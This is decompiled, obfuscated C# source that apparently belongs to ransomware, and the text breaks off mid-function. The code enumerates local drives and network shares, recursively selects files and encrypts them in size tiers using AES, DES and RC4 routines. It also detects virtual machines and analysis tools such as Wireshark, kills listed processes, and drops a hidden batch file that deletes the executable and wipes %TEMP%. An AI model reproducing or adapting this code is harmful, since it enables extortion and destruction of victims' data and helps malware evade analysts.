using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Main;
using Microsoft.Win32;
using NiceJson;
using SmartAssembly.MemoryManagement;
using ns0;
using ns1;
using ns2;
using ns3;
using ns5;

namespace ns4;

internal sealed class Class16
{
	static int smethod_0(JsonNode jsonNode_0)
	{
		return (int)Convert.ChangeType(((JsonBasic)jsonNode_0).m_value, typeof(int));
	}

	unsafe static List<string> smethod_1(string string_0)
	{
		void* ptr = stackalloc byte[13];
		List<string> list = new List<string>();
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		((byte*)ptr)[12] = 0;
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < string_0.Length)
		{
			switch (string_0[*(int*)((byte*)ptr + 8)])
			{
			case ',':
				if (((byte*)ptr)[12] == 0 && *(int*)ptr == 0)
				{
					list.Add(string_0.Substring(*(int*)((byte*)ptr + 4), *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4)));
					*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8) + 1;
				}
				break;
			case '"':
				if (*(int*)((byte*)ptr + 8) == 0 || string_0[*(int*)((byte*)ptr + 8) - 1] != '\\')
				{
					((byte*)ptr)[12] = ((((byte*)ptr)[12] == 0) ? ((byte)1) : ((byte)0));
				}
				break;
			case '[':
			case '{':
				if (((byte*)ptr)[12] == 0)
				{
					(*(int*)ptr)++;
				}
				break;
			case ']':
			case '}':
				if (((byte*)ptr)[12] == 0)
				{
					(*(int*)ptr)--;
				}
				break;
			}
			(*(int*)((byte*)ptr + 8))++;
		}
		list.Add(string_0.Substring(*(int*)((byte*)ptr + 4)));
		return list;
	}

	static short smethod_2(int int_0)
	{
		return (short)((Class19.Class25.byte_0[int_0 & 0xF] << 12) | (Class19.Class25.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class19.Class25.byte_0[(int_0 >> 8) & 0xF] << 4) | Class19.Class25.byte_0[int_0 >> 12]);
	}

	static void smethod_3(Class3 class3_0, string string_0)
	{
		if (!string.IsNullOrEmpty(string_0) && !Class16.smethod_87())
		{
			string_0 = string_0.ToUpper();
			if ('\\' != string_0[0] || '\\' != string_0[1])
			{
				string_0 = "\\\\" + string_0;
			}
		}
		if (Class16.smethod_12())
		{
			Class16.smethod_91(string_0, class3_0);
		}
		else
		{
			Class16.smethod_10(string_0, class3_0);
		}
	}

	static string smethod_4(byte[] byte_0)
	{
		return Convert.ToBase64String(byte_0);
	}

	unsafe static void smethod_5(byte[] byte_0, byte[] byte_1)
	{
		void* ptr = stackalloc byte[5];
		string[] logicalDrives = Environment.GetLogicalDrives();
		*(int*)ptr = 0;
		while (*(int*)ptr < logicalDrives.Length)
		{
			DriveInfo driveInfo = new DriveInfo(logicalDrives[*(int*)ptr]);
			if (((driveInfo.IsReady && driveInfo.DriveType != DriveType.CDRom) || driveInfo.DriveType != 0) && ((Class4.Class5.smethod_20() && driveInfo.DriveType == DriveType.Fixed) || (Class4.Class5.smethod_22() && driveInfo.DriveType == DriveType.Network) || (Class4.Class5.smethod_24() && driveInfo.DriveType == DriveType.Removable)))
			{
				Class16.smethod_72(driveInfo.Name, byte_0, byte_1);
			}
			(*(int*)ptr)++;
		}
		Class3 @class = Class16.smethod_42();
		if (@class == null)
		{
			return;
		}
		foreach (object item in @class)
		{
			string text = item.ToString();
			((byte*)ptr)[4] = 0;
			if (!text.Contains("ADMIN$") && !text.Contains("IPC$") && !text.Contains("print$") && !text.Contains("$"))
			{
				((byte*)ptr)[4] = 1;
			}
			if (((byte*)ptr)[4] != 0)
			{
				Class16.smethod_72(text, byte_0, byte_1);
			}
		}
	}

	static bool smethod_6(string string_0)
	{
		try
		{
			if (string_0.Contains(".exe"))
			{
				string_0 = string_0.Replace(".exe", "");
			}
			if (Process.GetProcessesByName(string_0).Length != 0)
			{
				return true;
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static string[] smethod_7(string string_0)
	{
		return string_0.Replace("[\n\t\"", "").Replace("\n\t\"", "").Replace("\"", "")
			.Replace("\n]", "")
			.Replace("[\n\t", "")
			.Replace("\n\t", "")
			.Split(new char[1] { ',' });
	}

	static void smethod_8(int int_0)
	{
		try
		{
			string value = Regex.Replace("@echo off\r\nPING 127.0.0.1 -n 1 >NUL\r\ndel \"%1\"\r\ndel /q/f/s %TEMP%", "%1", Application.get_ExecutablePath());
			string text = Path.Combine(Environment.GetEnvironmentVariable("TMP"), Path.GetRandomFileName() + ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.Write(value);
				streamWriter.Close();
			}
			Process process = new Process();
			process.StartInfo.FileName = text;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.UseShellExecute = true;
			process.Start();
			process.PriorityClass = ProcessPriorityClass.Normal;
		}
		catch (Exception)
		{
		}
		Environment.Exit(int_0);
	}

	static ICryptoTransform smethod_9(byte[] byte_0, byte[] byte_1, bool bool_0)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_1, byte_0) : dESCryptoServiceProvider.CreateEncryptor(byte_1, byte_0);
	}

	unsafe static void smethod_10(string string_0, Class3 class3_0)
	{
		void* ptr = stackalloc byte[26];
		*(int*)ptr = 50;
		Type typeFromHandle = typeof(Class3.Struct2);
		*(int*)((byte*)ptr + 4) = Marshal.SizeOf(typeFromHandle);
		*(ushort*)((byte*)ptr + 20) = (ushort)(20 * *(int*)((byte*)ptr + 4));
		IntPtr intPtr = Marshal.AllocHGlobal(*(ushort*)((byte*)ptr + 20));
		try
		{
			*(int*)((byte*)ptr + 8) = Class16.NetShareEnum_1(string_0, *(int*)ptr, intPtr, *(ushort*)((byte*)ptr + 20), out *(ushort*)((byte*)ptr + 22), out *(ushort*)((byte*)ptr + 24));
			if (124 == *(int*)((byte*)ptr + 8))
			{
				*(int*)ptr = 1;
				typeFromHandle = typeof(Class3.Struct3);
				*(int*)((byte*)ptr + 4) = Marshal.SizeOf(typeFromHandle);
				*(int*)((byte*)ptr + 8) = Class16.NetShareEnum_1(string_0, *(int*)ptr, intPtr, *(ushort*)((byte*)ptr + 20), out *(ushort*)((byte*)ptr + 22), out *(ushort*)((byte*)ptr + 24));
			}
			if (*(int*)((byte*)ptr + 8) != 0 && 234 != *(int*)((byte*)ptr + 8))
			{
				Console.WriteLine(*(int*)((byte*)ptr + 8));
				return;
			}
			*(int*)((byte*)ptr + 12) = 0;
			*(int*)((byte*)ptr + 16) = intPtr.ToInt32();
			while (*(int*)((byte*)ptr + 12) < *(ushort*)((byte*)ptr + 22))
			{
				IntPtr ptr2 = new IntPtr(*(int*)((byte*)ptr + 16));
				if (1 == *(int*)ptr)
				{
					Class3.Struct3 @struct = (Class3.Struct3)Marshal.PtrToStructure(ptr2, typeFromHandle);
					class3_0.method_0(@struct.string_0, string.Empty, @struct.method_0(), @struct.string_1);
				}
				else
				{
					Class3.Struct2 struct2 = (Class3.Struct2)Marshal.PtrToStructure(ptr2, typeFromHandle);
					class3_0.method_0(struct2.string_0, struct2.string_2, struct2.method_0(), struct2.string_1);
				}
				(*(int*)((byte*)ptr + 12))++;
				*(int*)((byte*)ptr + 16) += *(int*)((byte*)ptr + 4);
			}
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	static void smethod_11(byte[] byte_0, byte[] byte_1)
	{
		try
		{
			if (Class11.list_0.Count != 0)
			{
				string[] array = Class11.list_0.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					Class12.smethod_0(array[i], byte_1, byte_0, 8, 16);
				}
			}
			Class11.list_0.Clear();
			if (Class11.list_1.Count != 0)
			{
				string[] array = Class11.list_1.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					Class12.smethod_0(array[i], byte_1, byte_0, 16, 32);
				}
			}
			Class11.list_1.Clear();
			if (Class11.list_2.Count != 0)
			{
				string[] array = Class11.list_2.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					Class12.smethod_0(array[i], byte_1, byte_0, 32, 64);
				}
			}
			Class11.list_2.Clear();
		}
		catch (Exception)
		{
		}
	}

	static bool smethod_12()
	{
		return PlatformID.Win32NT == Environment.OSVersion.Platform;
	}

	static uint smethod_13(uint uint_0)
	{
		return uint_0 + 1;
	}

	unsafe static byte[] smethod_14(byte[] byte_0, byte[] byte_1)
	{
		void* ptr = stackalloc byte[8];
		int[] array = new int[256];
		int[] array2 = new int[256];
		byte[] array3 = new byte[byte_0.Length];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = byte_1[i % byte_1.Length];
			array2[i] = i;
		}
		i = 0;
		int num = 0;
		for (; i < 256; i++)
		{
			num = (num + array2[i] + array[i]) % 256;
			*(int*)((byte*)ptr + 4) = array2[i];
			array2[i] = array2[num];
			array2[num] = *(int*)((byte*)ptr + 4);
		}
		i = 0;
		num = 0;
		int num2 = 0;
		for (; i < byte_0.Length; i++)
		{
			num2++;
			num2 %= 256;
			num += array2[num2];
			num %= 256;
			*(int*)((byte*)ptr + 4) = array2[num2];
			array2[num2] = array2[num];
			array2[num] = *(int*)((byte*)ptr + 4);
			*(int*)ptr = array2[(array2[num2] + array2[num]) % 256];
			array3[i] = (byte)(byte_0[i] ^ *(uint*)ptr);
		}
		return array3;
	}

	static bool smethod_15(string string_0)
	{
		try
		{
			if (Class4.Class5.smethod_54().Contains(new FileInfo(string_0).Name.ToLower()))
			{
				return false;
			}
			if (Class4.Class5.smethod_62() + "." + Class4.Class5.smethod_64() == new FileInfo(string_0).Name)
			{
				return false;
			}
			string text = File.GetAttributes(string_0).ToString().ToLower();
			if (text.Contains("system"))
			{
				return false;
			}
			if (text.Contains("hidden") || text.Contains("readonly") || text.Contains("archive"))
			{
				File.SetAttributes(string_0, FileAttributes.Normal);
			}
			if (new FileInfo(string_0).Length >> 10 == 0L)
			{
				return false;
			}
			if (Class4.Class5.smethod_26() && new FileInfo(string_0).DirectoryName!.Contains("\\\\"))
			{
				return true;
			}
			if (Class4.Class5.smethod_48().Contains(new FileInfo(string_0).Extension.ToLower().Replace(".", "")))
			{
				return true;
			}
			if (Class4.Class5.smethod_26() && !(Environment.SystemDirectory.Substring(0, 1) == new FileInfo(string_0).FullName.Substring(0, 1)))
			{
				return true;
			}
			return false;
		}
		catch (UnauthorizedAccessException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	unsafe static string smethod_16(string string_0, int int_0)
	{
		void* ptr = stackalloc byte[20];
		*(double*)ptr = Math.Ceiling((double)string_0.Length / (double)int_0);
		if (*(double*)ptr < 2.0)
		{
			return string_0;
		}
		StringBuilder stringBuilder = new StringBuilder();
		*(int*)((byte*)ptr + 8) = 0;
		while ((double)(*(int*)((byte*)ptr + 8)) < *(double*)ptr)
		{
			if (*(int*)((byte*)ptr + 8) > 0)
			{
				stringBuilder.Append(Environment.NewLine);
			}
			*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 8) * int_0;
			*(int*)((byte*)ptr + 16) = Math.Min(int_0, string_0.Length - *(int*)((byte*)ptr + 12));
			string value = string_0.Substring(*(int*)((byte*)ptr + 12), *(int*)((byte*)ptr + 16));
			stringBuilder.Append(value);
			(*(int*)((byte*)ptr + 8))++;
		}
		return stringBuilder.ToString();
	}

	static void smethod_17(JsonArray.Class1 class1_0)
	{
		class1_0.int_0 = -1;
		((IDisposable)class1_0.enumerator_0).Dispose();
	}

	static bool smethod_18(Class19.Class21 class21_0)
	{
		return class21_0.int_0 == class21_0.int_1;
	}

	[DllImport("netapi32")]
	static extern int NetApiBufferFree(IntPtr intptr_0);

	static string smethod_19(string string_0)
	{
		StringBuilder stringBuilder = new StringBuilder(string_0.Length);
		for (int i = 0; i < string_0.Length; i++)
		{
			if (string_0[i] == '\\')
			{
				i++;
				switch (string_0[i])
				{
				case '\\':
					stringBuilder.Append(string_0[i]);
					break;
				case '/':
					stringBuilder.Append(string_0[i]);
					break;
				case '"':
					stringBuilder.Append(string_0[i]);
					break;
				case 'f':
					stringBuilder.Append('\f');
					break;
				case 'b':
					stringBuilder.Append('\b');
					break;
				case 'r':
					stringBuilder.Append('\r');
					break;
				default:
					stringBuilder.Append(string_0[i]);
					break;
				case 't':
					stringBuilder.Append('\t');
					break;
				case 'u':
					stringBuilder.Append((char)int.Parse(string_0.Substring(i + 1, 4), NumberStyles.AllowHexSpecifier));
					i += 4;
					break;
				case 'n':
					stringBuilder.Append('\n');
					break;
				}
			}
			else
			{
				stringBuilder.Append(string_0[i]);
			}
		}
		return stringBuilder.ToString();
	}

	static uint smethod_20(uint uint_0, uint uint_1)
	{
		return uint_0 + uint_1;
	}

	static long smethod_21(string string_0)
	{
		try
		{
			return new FileInfo(string_0).Length;
		}
		catch (Exception)
		{
		}
		return 0L;
	}

	static void smethod_22(byte[] byte_0, string string_0)
	{
		if (byte_0 == null)
		{
			throw new ArgumentNullException(string_0);
		}
		if (byte_0.Length != 8)
		{
			throw new CryptographicException("Invalid IV size; it must be 8 bytes.");
		}
	}

	static IEnumerator smethod_23(JsonObject jsonObject_0)
	{
		return new JsonObject.Class0(0)
		{
			jsonObject_0 = jsonObject_0
		};
	}

	unsafe static bool smethod_24(string string_0)
	{
		void* ptr = stackalloc byte[5];
		try
		{
			Process[] processes = Process.GetProcesses();
			*(int*)ptr = 0;
			while (*(int*)ptr < processes.Length)
			{
				Process process = processes[*(int*)ptr];
				if (process.MainWindowTitle.Contains(string_0) || process.ProcessName.Contains(string_0))
				{
					process.Dispose();
					GC.Collect();
					GC.WaitForPendingFinalizers();
					GC.Collect();
					((byte*)ptr)[4] = 1;
				}
				(*(int*)ptr)++;
			}
			((byte*)ptr)[4] = 0;
		}
		catch (Exception)
		{
			((byte*)ptr)[4] = 0;
		}
		return ((byte*)ptr)[4] != 0;
	}

	static byte[] smethod_25(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			if (Class4.Class5.smethod_46() != 16 && Class4.Class5.smethod_46() != 128)
			{
				if (Class4.Class5.smethod_46() != 32 && Class4.Class5.smethod_46() != 256)
				{
					return null;
				}
				rijndaelManaged.KeySize = 256;
				byte_2 = Class16.smethod_80(byte_0, 32, byte_2, 1024);
			}
			else
			{
				rijndaelManaged.KeySize = 128;
				byte_2 = Class16.smethod_80(byte_0, 16, byte_2, 1024);
			}
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.Key = byte_2;
			rijndaelManaged.IV = byte_0;
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_1, 0, byte_1.Length);
				cryptoStream.Close();
			}
			return memoryStream.ToArray();
		}
		catch (Exception)
		{
		}
		return null;
	}

	static Class19.Class23 smethod_26(Class19.Class24 class24_0)
	{
		byte[] array = new byte[class24_0.int_4];
		Array.Copy(class24_0.byte_1, class24_0.int_3, array, 0, class24_0.int_4);
		return new Class19.Class23(array);
	}

	unsafe static bool smethod_27(string string_0)
	{
		void* ptr = stackalloc byte[5];
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			string text = directoryInfo.Attributes.ToString();
			if (!text.Contains("Hidden") && !text.Contains("System"))
			{
				File.Create(Path.Combine(string_0, "Touch")).Dispose();
				File.Delete(Path.Combine(string_0, "Touch"));
				string[] array = Class4.Class5.smethod_56();
				*(int*)ptr = 0;
				while (true)
				{
					if (*(int*)ptr < array.Length)
					{
						string text2 = array[*(int*)ptr];
						if (!(directoryInfo.Name.ToLower() == text2))
						{
							(*(int*)ptr)++;
							continue;
						}
						((byte*)ptr)[4] = 0;
						break;
					}
					((byte*)ptr)[4] = 1;
					break;
				}
			}
			else
			{
				((byte*)ptr)[4] = 0;
			}
		}
		catch (Exception)
		{
			((byte*)ptr)[4] = 0;
		}
		return ((byte*)ptr)[4] != 0;
	}

	unsafe static string smethod_28(byte[] byte_0)
	{
		void* ptr = stackalloc byte[5];
		char[] array = new char[byte_0.Length * 2];
		*(int*)ptr = 0;
		int num = 0;
		while (*(int*)ptr < byte_0.Length)
		{
			((byte*)ptr)[4] = (byte)(byte_0[*(int*)ptr] >> 4);
			array[num] = (char)((((byte*)ptr)[4] > 9) ? (((byte*)ptr)[4] + 55 + 32) : (((byte*)ptr)[4] + 48));
			((byte*)ptr)[4] = (byte)(byte_0[*(int*)ptr] & 0xFu);
			array[++num] = (char)((((byte*)ptr)[4] > 9) ? (((byte*)ptr)[4] + 55 + 32) : (((byte*)ptr)[4] + 48));
			(*(int*)ptr)++;
			num++;
		}
		return new string(array);
	}

	[DllImport("netapi32", CharSet = CharSet.Unicode)]
	static extern int NetShareEnum(string string_0, int int_0, out IntPtr intptr_0, int int_1, out int int_2, out int int_3, ref int int_4);

	static uint smethod_29(byte[] byte_0, int int_0)
	{
		return (uint)(byte_0[int_0] | (byte_0[int_0 + 1] << 8) | (byte_0[int_0 + 2] << 16) | (byte_0[int_0 + 3] << 24));
	}

	unsafe static bool smethod_30(Class19.Class20 class20_0)
	{
		void* ptr = stackalloc byte[12];
		int num = Class16.smethod_52(class20_0.class22_0);
		while (num >= 258)
		{
			*(int*)ptr = class20_0.int_4;
			switch (*(int*)ptr)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class16.smethod_100(class20_0.class23_0, class20_0.class21_0)) & -256) == 0)
				{
					Class16.smethod_39(class20_0.class22_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class20_0.int_6 = Class19.Class20.int_0[num2 - 257];
					class20_0.int_5 = Class19.Class20.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class20_0.class23_1 = null;
				class20_0.class23_0 = null;
				class20_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class20_0.int_5 > 0)
				{
					class20_0.int_4 = 8;
					*(int*)((byte*)ptr + 4) = Class16.smethod_93(class20_0.class21_0, class20_0.int_5);
					if (*(int*)((byte*)ptr + 4) < 0)
					{
						return false;
					}
					Class16.smethod_96(class20_0.class21_0, class20_0.int_5);
					class20_0.int_6 += *(int*)((byte*)ptr + 4);
				}
				class20_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class16.smethod_100(class20_0.class23_1, class20_0.class21_0);
				if (num2 >= 0)
				{
					class20_0.int_7 = Class19.Class20.int_2[num2];
					class20_0.int_5 = Class19.Class20.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class20_0.int_5 > 0)
				{
					class20_0.int_4 = 10;
					*(int*)((byte*)ptr + 8) = Class16.smethod_93(class20_0.class21_0, class20_0.int_5);
					if (*(int*)((byte*)ptr + 8) < 0)
					{
						return false;
					}
					Class16.smethod_96(class20_0.class21_0, class20_0.int_5);
					class20_0.int_7 += *(int*)((byte*)ptr + 8);
				}
				Class16.smethod_51(class20_0.class22_0, class20_0.int_6, class20_0.int_7);
				num -= class20_0.int_6;
				class20_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static void smethod_31(int int_0, Class19.Class21 class21_0, byte[] byte_0, int int_1)
	{
		if (class21_0.int_0 < class21_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_0 + int_1;
		if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
				class21_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class21_0.int_2);
				class21_0.int_2 += 8;
			}
			class21_0.byte_0 = byte_0;
			class21_0.int_0 = int_0;
			class21_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static Class19.Class23 smethod_32(Class19.Class24 class24_0)
	{
		byte[] array = new byte[class24_0.int_3];
		Array.Copy(class24_0.byte_1, 0, array, 0, class24_0.int_3);
		return new Class19.Class23(array);
	}

	unsafe static void smethod_33(string string_0)
	{
		void* ptr = stackalloc byte[13];
		((byte*)ptr)[12] = 0;
		try
		{
			string[] files = Directory.GetFiles(string_0);
			string[] directories = Directory.GetDirectories(string_0);
			if (files != null)
			{
				string[] array = files;
				*(int*)((byte*)ptr + 8) = 0;
				while (*(int*)((byte*)ptr + 8) < array.Length)
				{
					string text = array[*(int*)((byte*)ptr + 8)];
					if (Class16.smethod_15(text))
					{
						((byte*)ptr)[12] = 1;
						*(long*)ptr = Class16.smethod_21(text) / 1048576L;
						if (Class4.Class5.smethod_28())
						{
							if (*(long*)ptr < 10L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 1, 2);
							}
							else if (*(long*)ptr < 20L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 3, 4);
							}
							else if (*(long*)ptr < 30L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 5, 6);
							}
							else if (*(long*)ptr < 40L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 7, 8);
							}
							else if (*(long*)ptr < 50L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 9, 10);
							}
							else if (*(long*)ptr < 60L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 11, 12);
							}
							else if (*(long*)ptr < 70L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 13, 14);
							}
							else if (*(long*)ptr < 80L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 15, 16);
							}
							else if (*(long*)ptr < 90L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 17, 18);
							}
							else if (*(long*)ptr < 100L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 19, 20);
							}
							else if (*(long*)ptr < 1000L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 32, 64);
							}
							else
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 64, 128);
							}
						}
						else if (*(long*)ptr < 100L)
						{
							Class11.list_0.Add(text);
						}
						else if (*(long*)ptr < 1000L)
						{
							Class11.list_1.Add(text);
						}
						else
						{
							Class11.list_2.Add(text);
						}
					}
					else
					{
						((byte*)ptr)[12] = 0;
					}
					(*(int*)((byte*)ptr + 8))++;
				}
			}
			if (directories != null)
			{
				string[] array = directories;
				*(int*)((byte*)ptr + 8) = 0;
				while (*(int*)((byte*)ptr + 8) < array.Length)
				{
					string string_ = array[*(int*)((byte*)ptr + 8)];
					if (Class16.smethod_27(string_))
					{
						Class16.smethod_33(string_);
					}
					(*(int*)((byte*)ptr + 8))++;
				}
			}
			if ((((directories != null && files != null) ? 1u : 0u) & (uint)((byte*)ptr)[12]) != 0)
			{
				Miscellaneous.smethod_0(string_0);
			}
		}
		catch (Exception)
		{
		}
	}

	static void smethod_34(JsonObject.Class0 class0_0)
	{
		class0_0.int_0 = -1;
		((IDisposable)class0_0.enumerator_0).Dispose();
	}

	unsafe static bool smethod_35(string[] string_0)
	{
		void* ptr = stackalloc byte[9];
		try
		{
			string[] array = Class16.smethod_47("tasklist", "/V /FO CSV").Split(new string[3] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
			List<string> list = new List<string>();
			*(int*)ptr = 0;
			while (*(int*)ptr < array.Length)
			{
				string text = array[*(int*)ptr].Split(new char[1] { ',' })[0].ToLower().Replace("\"", "");
				if (!(text == "") && text.Contains(".exe"))
				{
					list.Add(array[*(int*)ptr].Split(new char[1] { ',' })[0].ToLower().Replace("\"", "").Replace(".exe", ""));
				}
				(*(int*)ptr)++;
			}
			string[] array2 = list.ToArray();
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array2.Length)
			{
				string text2 = array2[*(int*)((byte*)ptr + 4)];
				if (string_0.Contains(text2))
				{
					Class16.smethod_83("taskkill", $"/F /IM {text2}.exe");
				}
				(*(int*)((byte*)ptr + 4))++;
			}
			((byte*)ptr)[8] = 1;
		}
		catch (Exception)
		{
			((byte*)ptr)[8] = 0;
		}
		return ((byte*)ptr)[8] != 0;
	}

	static bool smethod_36()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Console", writable: true);
			if (Registry.GetValue(registryKey.ToString(), "WordLoad", null) == null)
			{
				registryKey.SetValue("WordLoad", 1, RegistryValueKind.DWord);
				return true;
			}
			return false;
		}
		catch (Exception)
		{
		}
		return false;
	}

	static bool smethod_37()
	{
		try
		{
			string text = Class16.smethod_83("wmic", "path win32_VideoController get name");
			Class16.smethod_83("tasklist", "m");
			if (!text.Contains("VirtualBox Graphics Adapter") && !text.Contains("VMware SVGA") && !text.Contains("Parallels Video Adapter") && !text.Contains("PVM Additions S3 Trio32/64") && !text.Contains("S3 Trio32/64") && !Class16.smethod_24("xenservice") && !Class16.smethod_24("VMSrvc") && !Class16.smethod_24("VMUSrvc") && !Class16.smethod_24("VBoxTrayToolWndClass") && !Class16.smethod_24("VBoxTrayToolWnd") && !Class16.smethod_24("vmtoolsd") && !Class16.smethod_24("vmwaretray") && !Class16.smethod_24("vmwareuser") && !Class16.smethod_24("VGAuthService") && !Class16.smethod_24("vmacthlp") && !Class16.smethod_24("prl_cc") && !Class16.smethod_24("prl_tools") && !Class16.smethod_24("vmtoolsd"))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	[DllImport("svrapi", CharSet = CharSet.Ansi, EntryPoint = "NetShareEnum")]
	static extern int NetShareEnum_1([MarshalAs(UnmanagedType.LPTStr)] string string_0, int int_0, IntPtr intptr_0, ushort ushort_0, out ushort ushort_1, out ushort ushort_2);

	static bool smethod_38()
	{
		try
		{
			if (!Class16.smethod_24("Sysinternals: www.sysinternals.com") && !Class16.smethod_24("wireshark") && !Class16.smethod_24("EtherD") && !Class16.smethod_24("EtherDetect") && !Class16.smethod_24("The Wireshark Network Analyzer") && !Class16.smethod_24("dumpcap") && !Class16.smethod_24("sysAnalyzer") && !Class16.smethod_24("TCPView") && !Class16.smethod_24("C:\\Program Files\\Wireshark\\") && !Class16.smethod_24("NETSTAT") && !Class16.smethod_24("sniff_hit"))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static void smethod_39(Class19.Class22 class22_0, int int_0)
	{
		if (class22_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class22_0.byte_0[class22_0.int_0++] = (byte)int_0;
		class22_0.int_0 &= 32767;
	}

	unsafe static int smethod_40(int int_0, int int_1, Class19.Class22 class22_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = class22_0.int_0;
		if (int_1 > class22_0.int_1)
		{
			int_1 = class22_0.int_1;
		}
		else
		{
			*(int*)ptr = (class22_0.int_0 - class22_0.int_1 + int_1) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = int_1;
		*(int*)((byte*)ptr + 8) = int_1 - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(class22_0.byte_0, 32768 - *(int*)((byte*)ptr + 8), byte_0, int_0, *(int*)((byte*)ptr + 8));
			int_0 += *(int*)((byte*)ptr + 8);
			int_1 = *(int*)ptr;
		}
		Array.Copy(class22_0.byte_0, *(int*)ptr - int_1, byte_0, int_0, int_1);
		class22_0.int_1 -= *(int*)((byte*)ptr + 4);
		if (class22_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return *(int*)((byte*)ptr + 4);
	}

	static bool smethod_41(JsonNode jsonNode_0)
	{
		return (bool)Convert.ChangeType(((JsonBasic)jsonNode_0).m_value, typeof(bool));
	}

	static Class3 smethod_42()
	{
		return Class3.class3_0 ?? (Class3.class3_0 = new Class3());
	}

	static void smethod_43()
	{
		try
		{
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				MemoryManager.memoryManager_0 = new MemoryManager();
			}
		}
		catch
		{
		}
	}

	unsafe static int smethod_44(Class19.Class21 class21_0, byte[] byte_0, int int_0, int int_1)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		while (class21_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class21_0.uint_0;
			class21_0.uint_0 >>= 8;
			class21_0.int_2 -= 8;
			int_1--;
			(*(int*)ptr)++;
		}
		if (int_1 == 0)
		{
			return *(int*)ptr;
		}
		*(int*)((byte*)ptr + 4) = class21_0.int_1 - class21_0.int_0;
		if (int_1 > *(int*)((byte*)ptr + 4))
		{
			int_1 = *(int*)((byte*)ptr + 4);
		}
		Array.Copy(class21_0.byte_0, class21_0.int_0, byte_0, int_0, int_1);
		class21_0.int_0 += int_1;
		if (((uint)(class21_0.int_0 - class21_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			byte[] byte_ = class21_0.byte_0;
			*(int*)((byte*)ptr + 8) = class21_0.int_0;
			class21_0.int_0 = *(int*)((byte*)ptr + 8) + 1;
